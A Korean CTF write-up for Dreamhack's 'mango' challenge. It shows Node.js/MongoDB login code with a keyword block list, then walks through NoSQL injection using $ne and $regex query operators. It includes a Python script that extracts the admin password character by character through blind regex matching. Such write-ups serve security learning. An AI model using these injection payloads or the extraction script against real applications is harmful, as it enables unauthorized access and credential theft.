## [Dreamhack] mango 문제 풀이

* 문제 설명

이 문제는 데이터베이스에 저장된 플래그를 획득하는 문제입니다.플래그는 admin 계정의 비밀번호 입니다.플래그의 형식은 DH{...} 입니다.{'uid': 'admin', 'upw': 'DH{32alphanumeric}'}

* 주요 코드

```javascript
// 쿼리 필터링
// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}

// 로그인 엔드포인트
app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});
```

## 풀이 과정

- 로그인 엔드포인트에 ['admin', 'dh', 'admi'] 외에는 필터링이 없이 그대로 입력되는 것을 확인

### 시도 1

- 쿼리에 uid={"$ne":"a"} 을 넣어보기 => 파서가 {}와 안의 문자 모두 문자열로 취급하여 uid = '{"$ne":"guest"}' 이 됨
=> [] 문법을 통해 중첩 객체 사용해야함 => 쿼리에 uid[$ne]=a&upw[$ne]=a 넣음
http://host3.dreamhack.games:12334/login?uid[$ne]=a&upw[$ne]=a


- 결과:findOne 함수에 의해 매칭 된 가장 위의 값 guest만 매칭이 됨 => id는 admin이 되게 pw는 admin의 pw가 되게 해야 함

### 시도 2

- admin은 필터링이 되므로 mongoDB의 정규표현식 매칭법 $regex 사용 => uid[$regex]=^adm
- 코드에서 upw: 'DH{32alphanumeric}'라고 나와있으므로 pw는 DH로 시작 => upw[$regex]=^D
http://host3.dreamhack.games:12334/login?uid[$regex]=^adm&upw[$regex]=^D

- 결과: admin으로 접속에 성공

### 시도 3

- flag는 admin의 pw이므로 결국 pw를 알아내야 함 => $regex를 이용한 매칭을 통해 한자씩 알아내야 함 => 이를 위해 자동화 코드 제작

```python

#!/usr/bin/python3

import string
import requests
import urllib.parse

char_set = string.ascii_letters + string.digits //pw의 값이 32alphanumeric라고 써있으므로 a-zA-Z0-9 제작
password =""

for i in range(36):
    for ch in char_set:
        ps = password + ch
        url=f"http://host3.dreamhack.games:12334/login?uid[$regex]=^ad&upw[$regex]=^{ps}" 
        result = requests.get(url)
        if "admin" in result.text:
            password = ps
            break
    print(password)

print(password)
```

- 결과: 실행 결과 D에서 값이 맴돌음 => DH필터 때문에 값이 필터링 됨 

### 시도 4

- 결과:  dump = JSON.stringify(data).toLowerCase(); 는 데이터를 문자열화 하고 소문자화 한 후에 검증하는 구조라 우회가 안먹힘 => 'DH{' 이후부터 검색을 하는 방법으로 변경
